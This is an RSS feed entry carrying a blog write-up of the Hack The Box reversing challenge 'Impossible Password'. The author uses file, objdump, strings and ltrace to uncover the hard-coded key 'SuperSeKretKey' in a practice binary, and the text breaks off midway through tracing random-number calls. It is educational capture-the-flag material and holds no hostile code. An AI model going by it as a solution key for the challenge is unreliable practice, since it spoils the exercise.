<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>hackthebox on Cihat Yildiz</title>
    <link>https://www.cihatyildiz.com/categories/hackthebox/</link>
    <description>Cihat Yildiz (hackthebox)</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sun, 25 Jul 2021 20:55:00 +0000</lastBuildDate>
    
    <atom:link href="https://www.cihatyildiz.com/categories/hackthebox/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Reversing Challenge - Hack The Box - Impossible Password</title>
      <link>https://www.cihatyildiz.com/post/2021-07-25-hack-the-box-reversing-impossible-password/</link>
      <pubDate>Sun, 25 Jul 2021 20:55:00 +0000</pubDate>
      
      <guid>https://www.cihatyildiz.com/post/2021-07-25-hack-the-box-reversing-impossible-password/</guid>
      <description>&lt;p&gt;In this blog post, we will see the solution of a Hack-The-Box reversing challenge called &amp;ldquo;Impossible Password&amp;rdquo;. Its been a long time solving some reversing puzzles :)&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s check the binary first.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ file impossible_password.bin 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;impossible_password.bin: ELF 64-bit LSB executable, x86-64, version &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SYSV&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; GNU/Linux 2.6.32, BuildID&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;sha1&lt;span style=&#34;color:#f92672&#34;&gt;]=&lt;/span&gt;ba116ba1912a8c3779ddeb579404e2fdf34b1568, stripped
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This is a 64-bit ELF binary. So, we can use &lt;em&gt;objdump&lt;/em&gt; command to see imported functions in this application&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ objdump -T impossible_password.bin 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;impossible_password.bin:     file format elf64-x86-64
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;DYNAMIC SYMBOL TABLE:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt;      DF *UND*  &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt;  GLIBC_2.2.5 putchar
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt;      DF *UND*  &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt;  GLIBC_2.2.5 printf
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt;      DF *UND*  &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt;  GLIBC_2.2.5 __libc_start_main
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt;      DF *UND*  &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt;  GLIBC_2.2.5 srand
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt;      DF *UND*  &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt;  GLIBC_2.2.5 strcmp
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt;  w   D  *UND*  &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt;              __gmon_start__
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt;      DF *UND*  &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt;  GLIBC_2.2.5 time
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt;      DF *UND*  &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt;  GLIBC_2.2.5 malloc
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt;      DF *UND*  &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt;  GLIBC_2.7   __isoc99_scanf
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt;      DF *UND*  &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt;  GLIBC_2.2.5 exit
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt;      DF *UND*  &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt;  GLIBC_2.2.5 rand
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can the that the application uses a couple functions from &lt;em&gt;glibc&lt;/em&gt; library. We can use this information during our analysis.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ strings impossible_password.bin 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--- SNIP ---
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;printf
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;malloc
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;strcmp
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;__libc_start_main
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GLIBC_2.7
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GLIBC_2.2.5
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SuperSeKretKey
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;%20s
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GCC: &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;GNU&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; 4.8.5 &lt;span style=&#34;color:#ae81ff&#34;&gt;20150623&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Red Hat 4.8.5-11&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--- SNIP ---
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;When I search strings in the application I can see many information, but looks like &amp;ldquo;SuperSeKretKey&amp;rdquo; is different than others. Now let&amp;rsquo;s run the application and see how it works.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ./impossible_password.bin 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;* asdada
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;asdada&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The application shows what I enter as an input. Now I will use ltrace application to see if there is any library functions are used.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ltrace ./impossible_password.bin                                                                                                                                                                                                                     &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; тип
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;__libc_start_main&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x40085d, 1, 0x7ffdb1afea48, 0x4009e0 &amp;lt;unfinished ...&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;printf&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;* &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                                                                 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;__isoc99_scanf&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x400a82, 0x7ffdb1afe930, 0, 0* testString
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                               &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;printf&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[%s]\n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;testString&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;testString&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                                               &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;strcmp&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;testString&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;SuperSeKretKey&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                                       &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;exit&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &amp;lt;no &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ...&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;+++ exited &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;status 1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; +++
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Basically what happens is, the application compare my input with &amp;ldquo;&lt;em&gt;SuperSeKretKey&lt;/em&gt;&amp;rdquo;. if my input doesn&amp;rsquo;t match with the string data, exit the program.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ltrace ./impossible_password.bin                                                                                                                                                                                                                   &lt;span style=&#34;color:#ae81ff&#34;&gt;130&lt;/span&gt; тип
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;__libc_start_main&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x40085d, 1, 0x7ffed7da77a8, 0x4009e0 &amp;lt;unfinished ...&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;printf&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;* &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                                                                 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;__isoc99_scanf&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x400a82, 0x7ffed7da7690, 0, 0* SuperSeKretKey
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                               &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;printf&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[%s]\n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;SuperSeKretKey&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;SuperSeKretKey&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                                           &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;strcmp&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;SuperSeKretKey&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;SuperSeKretKey&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                                   &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;printf&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;** &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                                                                &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;__isoc99_scanf&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x400a82, 0x7ffed7da7690, 0, 0** testString
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                               &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;time&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                                                                      &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1626591042&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;srand&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x9489d839, 10, 0x930c3128, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                                         &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;malloc&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;21&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                                                                   &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0x22e9ac0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rand&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x22e9ac0, 21, 33, 0x22e9ad0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                                           &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0x6c8094
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rand&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x7f3b53b9c740, 0x7ffed7da75f4, 0x22e9ac0, 94&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                          &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0x5436d442
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rand&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x7f3b53b9c740, 0x7ffed7da75f4, 0x22e9ac1, 94&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                          &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0xa242547
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rand&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x7f3b53b9c740, 0x7ffed7da75f4, 0x22e9ac2, 94&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                          &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0x2a045efa
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rand&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x7f3b53b9c740, 0x7ffed7da75f4, 0x22e9ac3, 94&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                          &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0x379c34a0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rand&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x7f3b53b9c740, 0x7ffed7da75f4, 0x22e9ac4, 94&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                          &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0x75ec02c3
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rand&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x7f3b53b9c740, 0x7ffed7da75f4, 0x22e9ac5, 94&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                          &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0x74091ee1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rand&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x7f3b53b9c740, 0x7ffed7da75f4, 0x22e9ac6, 94&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                          &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0x22097b52
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rand&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x7f3b53b9c740, 0x7ffed7da75f4, 0x22e9ac7, 94&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                          &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0x156e190a
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rand&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x7f3b53b9c740, 0x7ffed7da75f4, 0x22e9ac8, 94&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                          &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0x624047de
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rand&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x7f3b53b9c740, 0x7ffed7da75f4, 0x22e9ac9, 94&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                          &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0x6893f2f1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rand&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x7f3b53b9c740, 0x7ffed7da75f4, 0x22e9aca, 94&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                          &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0x17211d98
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rand&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x7f3b53b9c740, 0x7ffed7da75f4, 0x22e9acb, 94&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                          &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0x264b215c
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rand&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x7f3b53b9c740, 0x7ffed7da75f4, 0x22e9acc, 94&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                          &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0x106a3853
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rand&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x7f3b53b9c740, 0x7ffed7da75f4, 0x22e9acd, 94&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                          &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0xce7992a
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rand&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x7f3b53b9c740, 0x7ffed7da75f4, 0x22e9ace, 94&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                          &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0x3d0562f5
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rand&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x7f3b53b9c740, 0x7ffed7da75f4, 0x22e9acf, 94&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                          &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0x14484045
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rand&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x7f3b53b9c740, 0x7ffed7da75f4, 0x22e9ad0, 94&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                          &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0x4e8f4c28
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rand&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x7f3b53b9c740, 0x7ffed7da75f4, 0x22e9ad1, 94&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                          &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0x2b6ff460
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rand&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x7f3b53b9c740, 0x7ffed7da75f4, 0x22e9ad2, 94&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                          &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0x33cf64a2
